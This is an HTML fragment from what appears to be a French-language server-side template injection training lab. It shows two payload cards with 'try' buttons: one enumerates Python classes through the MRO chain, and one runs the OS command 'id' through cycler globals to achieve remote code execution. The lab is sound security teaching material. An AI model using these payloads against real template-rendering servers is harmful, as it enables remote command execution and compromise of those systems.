...
<div class="banner"><i class="fa-solid fa-triangle-exclamation"></i> SSTI LAB — VULNÉRABLE <span>| Server-Side Template Injection | CWE-94 | OWASP A03:2021 | Sécurisé : localhost:5006</span><button id="lang-btn" onclick="toggleLang()" style="margin-left:auto;background:#222;border:2px solid #ffeb3b;color:#ffeb3b;padding:8px 20px;border-radius:6px;cursor:pointer;font-size:1em;font-weight:700">EN</button></div>
<div class="container">
...
<div class="pl" style="border:1px solid #da3633;background:#1a0505"><div class="lbl" style="color:#f85149">&#9760; Payload 4 — Enumération des classes Python (MRO)</div><div class="cd">{{{{&#39;&#39;.__class__.__mro__[1].__subclasses__()}}}}</div><div class="desc">Liste TOUTES les classes Python chargées. Première étape vers l'exécution de code.</div><button class="btn btn-red" data-v="{{{{&#39;&#39;.__class__.__mro__[1].__subclasses__()}}}}" onclick="setPayload(this)"><i class="fa-solid fa-skull-crossbones"></i> Essayer</button></div>
<div class="pl" style="border:1px solid #da3633;background:#1a0505"><div class="lbl" style="color:#f85149">&#9760; Payload 5 — RCE via cycler (exécution OS)</div><div class="cd">{{{{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}}}</div><div class="desc">Exécute la commande &quot;id&quot; sur le serveur via la chaîne cycler→globals→os. RCE complet.</div><button class="btn btn-red" data-v="{{{{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}}}" onclick="setPayload(this)"><i class="fa-solid fa-skull-crossbones"></i> Essayer</button></div>
